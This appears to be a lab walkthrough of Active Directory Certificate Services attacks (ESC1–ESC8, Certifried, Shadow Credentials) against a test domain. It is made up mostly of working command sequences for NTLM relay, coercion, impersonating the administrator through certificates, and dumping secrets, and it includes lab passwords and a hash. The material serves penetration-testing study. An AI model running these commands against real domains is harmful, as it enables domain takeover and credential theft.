Active Directory Certificate Services may be configured in a vulnerable way, which allow attackers to do the following things:

- Steal User Credentials
- Persist in Machines
- Escalate Domain Paths
- Persist in Domains

A great blog post detailing exploitation using `ADCs` can be found [here](https://posts.specterops.io/certified-pre-owned-d95910965cd2).

### ESC08
This attack requires the following prerequisites:

- `ADCS` Running with web enrollment enabled
- A method for coercion
- A template vulnerable to `ESC8`

HTTP-based certificate enrollment interfaces are usually vulnerable to `NTLM-relay` attacks. To check if web enrollment is running, a web-request to the endpoint `/certsrv/certfnsh.asp` can be made. The target here is `BRAAVOS`, as it has a `IIS Webserver` running:
```bash
wget http://10.3.10.23/certsrv/certfnsh.asp
```
```bash
# output:
```
```http
HTTP request sent, awaiting response... 401 Unauthorized

Username/Password Authentication Failed.
```
A `401 Unauthorized` indicates that it is indeed present.

For the next step, `ntlmrelayx` is started to relay `SMB` Authentication to this `HTTP-based certificate enrollment interface`. The using the template `DomainController` to exploit it:
```bash
./ntlmrelayx.py -t http://10.3.10.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# --adcs: tells ntlmrelay that the target is ADCS
# --template: Use the certificate template
```

Now, a coercion method is required to force the `DC03` (`MEEREEN`) to connect to the controlled endpoint. A tool named `petitpotam.py` found on [this github](https://github.com/topotam/PetitPotam) will attempt coerce the DC into connection, without providing valid credentials. This will not work on up-to-date `AD`s anymore, but authenticated coercion's with tools like `coercer` should still work. `petitpotam.py` can be used like this:
```bash
petitpotam.py <local_ip> meereen.essos.local
```

And the authenticated coercion method can be used like this:
```bash
coercer coerce -u <user> -p <pass> -d <usr_domain> -t meereen.essos.local -l <local_ip>
```
> **_NOTE:_** If this does not work, try to use `pip3 install pyOpenSSL==24.0.0`.

In my case, `petitpotam.py` did not work, but `coercer` gave me the following output:
```bash
[*] Base64 certificate of user MEEREEN$:
MIIRbQIBAzCCEScGCSqGSIb3DQEHAaCCERgEghE...
```
This `base64` certificate must be saved in a file. i called mine `cert.b64`.

Then, the tool `gettgtpkinit.py` from [this github](https://github.com/dirkjanm/PKINITtools) can be used to get the `TGT` of the `DC03`:
```bash
python3 ./gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'
```
```bash
# output:
```
```bash
190 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

This `TGT` can then be used to dump secrets using `secretsdump` (can also be used for anything else):
```bash
export KRB5CCNAME=./meereen.ccache
```
```bash
impacket-secretsdump -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
```

`certipy-ad` is a tool which automates the process above with the `relay`, and `auth` options. but it essentially achieves the same goal as the tools above.

#### Certipy Bloodhound Enum
It is possible to enumerate `ADCS` using `bloodhound`. `certipy-ad` offers an `ingestor` for bloodhound, which specifically searches for vulnerable `certificate templates`.
```bash
certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 10.3.10.12 -old-bloodhound -vulnerable
```
> **_NOTE:_** If this does not work, try to use `pip3 install certipy-ad==4.8.0`.
> Also, if you attempt to attach this data to existing `bloodhound` data, attach it to data collected by `sharphound`, and not other remote collectors.


After uploading the zip file in `bloodhound`, all principals with certificate enrollment rights can be queried using this `cypher` query:
```cypher
MATCH p = ()-[:Enroll|AllExtendedRights|GenericAll]->(ct:CertTemplate)  
RETURN p
```

### ESC01
This vulnerability can be found using this `cypher` query in `bloodhound`:
```cypher
MATCH p = ()-[:ADCSESC1]->()  
RETURN p
```
Alternatively, it can also be seen in the generated `TXT` or `json` file of `certipy`, if it was used like this:
```bash
certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 10.3.10.12 -vulnerable
```
```bash
# output:
```
```powershell
[!] Vulnerabilities
ESC1 : Enrollee supplies subject and template allows client authentication.
```

As the edge in bloodhound implies, this mis-configuration can be exploited using the following steps:
#### Step 1:
Use `certipy` to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate:
```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
```
```bash
# output:
```
```bash
[*] Saved certificate and private key to 'administrator.pfx'
```

#### Step 2:
Request a `TGT` from the domain, specifying the certificate created in Step 1 and the IP of the DC.
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.3.10.12
```

#### Step 3:
Using the acquired `TGT` of the administrator, the typical commands like `secretsdump` can be executed:
```bash
export KRB5CCNAME=./administrator.ccache
```
```bash
secretsdump.py -k -no-pass -dc-ip 'meereen.essos.local' @'meereen.essos.local'
```

### ESC02 / ESC03
This vulnerability can be found using this `cypher` query in `bloodhound`:
```cypher
MATCH p = ()-[:ADCSESC3]->()  
RETURN p
```
Alternatively, it can also be seen in the generated `TXT` or `json` file of `certipy`, if it was used like this:
```bash
certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 10.3.10.12 -vulnerable
```
```bash
# output:
```
```powershell
[!] Vulnerabilities
ESC2 : Template can be used for any purpose.
ESC3 : Template has Certificate Request Agent EKU set.
```

Just like with `ESC01`, it turns out that `khal.drogo` and `missandei` are included in the `DOMAIN USERS` group, which have the `ADCSESC3` attribute to `ESSOS`!

This vulnerability is summarized on the `certipy` page:
```text
“ESC2 is when a certificate template can be used for any purpose. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3 for most certificate templates.”
```

As the edge in `bloodhound` implies, this template mis-configuration can be exploited as follows:
#### Step 1:
Use `certipy` to request an enrollment agent certificate. (allows authorized individuals or services to enroll certificates on behalf of others within a system.)
```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target 10.3.10.23 -template ESC2 -ca ESSOS-CA
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# Note: -template ESC3 and -template ESC-CRA may also be used!
```

```bash
# output:
```
```bash
[*] Saved certificate and private key to 'khal.drogo.pfx'
```

#### Step 2:
Use the enrollment agent certificate to issue a certificate request on behalf of another user. That request is made on a certificate template that allows for authentication and permits enrollment via agent enrollment.
This means that the same request as before is being made, but on behalf of someone else:
```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target 10.3.10.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
```
```bash
# output:
```
```bash
[*] Saved certificate and private key to 'administrator.pfx'
```

#### Step 3:
The steps from `ESC01` may now be repeated, as the `TGT` can now be requested for the impersonated account. With that `TGT` the secrets can be dumped again for example:
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.3.10.12
```
```bash
export KRB5CCNAME=./administrator.ccache
```
```bash
secretsdump.py -k -no-pass -dc-ip 'meereen.essos.local' @'meereen.essos.local'
```

### ESC04
This vulnerability can be found using this `cypher` query in `bloodhound`:
```cypher
MATCH p = ()-[:ADCSESC4]->()  
RETURN p
```
Alternatively, it can also be seen in the generated `TXT` or `json` file of `certipy`, if it was used like this:
```bash
certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 10.3.10.12 -vulnerable
```
```bash
# output:
```
```powershell
[!] Vulnerabilities
ESC4 : User has dangerous permissions.
```

Now, `khal.drogo` has the `ADCSESC3` attribute to `ESSOS`! Upon further investigation, this is due to him having the `GenericAll` attribute towards the `ESC04@ESSOS.LOCAL`!

As the edge in `bloodhound` implies, this is exploitable as follows:
```bash
Step 0.1: Obtain ownership (WriteOwner only)
...
Step 0.2: Obtain GenericAll (WriteOwner, Owns, or WriteDacl only)
...
```

These steps may be skipped, as the owned user `khal.drogo` already has the `GenericAll` attribute towards `ESC04`.
#### Step 1:
Make certificate template `ESC1` abuse-able (via `GenericAll`). The configuration of the template is changed so that it is vulnerable to `ESC1` (explained before).
```bash
certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old
```
```bash
# output:
```
```bash
[*] Saved old configuration for 'ESC4' to 'ESC4.json'
[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'
```

Steps 2 and 3 are the same as the steps in `ESC01`, as `ESC01`was effectively forced upon this certificate template, which is why they will not be shown here.

> **_NOTE:_** Before executing commands such as `secretsdump`, make sure to restore the old configuration of the certificate template as follows:
```bash
certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
```
```bash
# output:
```
```bash
[*] Successfully updated 'ESC4'
```
**IMPORTANT**: before we do our usual shenanigans such as dumping secrets with the `administrator.ccache`, we must restore the old configuration:

### ESC06
This vulnerability is summarized on the `certipy` page:
```bash
“ESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template’s configuration.”
```
It can also be seen in the generated `TXT` file of `certipy`:
```powershell
[!] Vulnerabilities
ESC6 : Enrollee can specify SAN.
```

This basically allows for the exploitation of `ESC1`, without specifying the `ESC1` template. The `User` template can be used, which by default, domain users can enroll into. The steps are summarized below:
```bash
# step 1
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -upn administrator@essos.local
# step 2
certipy auth -pfx administrator.pfx -dc-ip 10.3.10.12
# step 3
export KRB5CCNAME=./administrator.ccache
# --
secretsdump.py -k -no-pass -dc-ip 'meereen.essos.local' @'meereen.essos.local'
```

### CVE-2022–26923
As a short summary, this CVE stems from the fact, that the `dNSHostName` property of a computer must not be unique. This allows any computer to impersonate domain controllers, as confusions might happen similar to the `samAccountNameVulnerability`. A more detailed explanation can be found [here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) 

To exploit this `CVE`, an account must first be created with a `dNSHostName` entry, which might get confused for the DC controller:
```bash
certipy account create -u khal.drogo@essos.local -p 'horse' -user 'certifriedpc' -pass 'certifriedpass' -dns 'meereen.essos.local'
```
```bash
# output:
```
```bash
[*] Successfully created account 'certifriedpc$' with password 'certifriedpass'
```

It is now possible to request a `Machine` template using the new account, as by default domain computers can enroll in the `Machine` certificate template:
```bash
certipy req -u 'certifriedpc$'@essos.local -p 'certifriedpass' -target braavos.essos.local -ca ESSOS-CA -template Machine
```
```bash
# output:
```
```bash
[*] Saved certificate and private key to 'meereen.pfx'
```

Now comes the interesting part. It is possible to authenticate with this certificate as `MEEREEN` (`DC03`):
```bash
certipy auth -pfx meereen.pfx -username 'meereen$' -domain essos.local -dc-ip 10.3.10.12
```
```bash
# output:
```
```bash
[*] Saved credential cache to 'meereen.ccache'
```

The `TGT` of the domain controller was acquired, but the DC itself does not have the possibility to achieve much. It is possible however, to impersonate the `Administrator` by abusing the `S4U2SELF` property, which allows a service to obtain a service ticket, on behalf of a user, to itself:
```bash
export KRB5CCNAME=./meereen.ccache
```
```bash
impacket-getST -self -impersonate 'administrator' -altservice 'CIFS/meereen.essos.local' -k -no-pass -dc-ip 'meereen.essos.local' 'essos.local'/'meereen'
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# alternatively using `HTTP` instead of `CIFS`
```

```bash
# output:
```
```bash
[*] Saving ticket in administrator@CIFS_meereen.essos.local@ESSOS.LOCAL.ccache
```

With this `TGT` of the `Administrator`, It is possible to execute the usual commands:
```bash
export KRB5CCNAME=./administrator@HTTP_meereen.essos.local@ESSOS.LOCAL.ccache
```
```bash
wmiexec.py -k @meereen.essos.local 
```
```bash
# or
```
```bash
evil-winrm -i meereen.essos.local -r ESSOS.LOCAL 
```
```bash
# or
```
```bash
secretsdump.py -k -no-pass -dc-ip 'meereen.essos.local' @'meereen.essos.local'
```


### Shadow Credentials
... attacks stem from the pre-authentication in `kerberos` being able to be validated symmetrically OR asymmetrically (called `PKINIT`).  AD Users and Computers have a attribute called `msDS-KeyCredentialLink` which stores raw public keys. When pre-authenticating with `PKINIT`, the `KDC` will check if knowledge of the matching private key is there. if so, the user will receive a `TGT`.

To find out if this attack is possible, the `Outbound Object Control`'s of owned users must be inspected for outgoing attributes such as `GenericAll` or `GenericWrite` towards other objects. This allows for the following attacks:

- `Targeted Kerberoast`: Add `SPN`, `Kerberoast`, remove `SPN`
- `ForceChangePassword`: Change users password using `sambas net` tool.
- `Shadow Credentials`: Create `RSA` key pair, add new authentication method for a user.

Targeted `Kerberoasts` rely on weak passwords for cracking, and Changing the Passwords of users is not ideal in real scenarios.

The user `khal.drogo` has an outbound `GenericAll` control towards `viserys.targaryen`, which is abuse-able.  Shadow Credential attacks are usually done with `pywhisker.py` (needs the second tool `gettgtpkinit.py` to get `TGT`), but `certipy` works too, and it gives you the `TGT` after executing this command:
```bash
certipy shadow auto -u khal.drogo@essos.local -p 'horse' -account 'viserys.targaryen'
```

`viserys.targaryen`'s outbound object controls show that there is a `GenericWrite` towards `jorah.mormont`! This attack may then be repeated:
```bash
certipy shadow auto -u viserys.targaryen@essos.local -hashes 'd96a55df6bef5e0b4d6d956088036097' -account 'jorah.mormont'
```
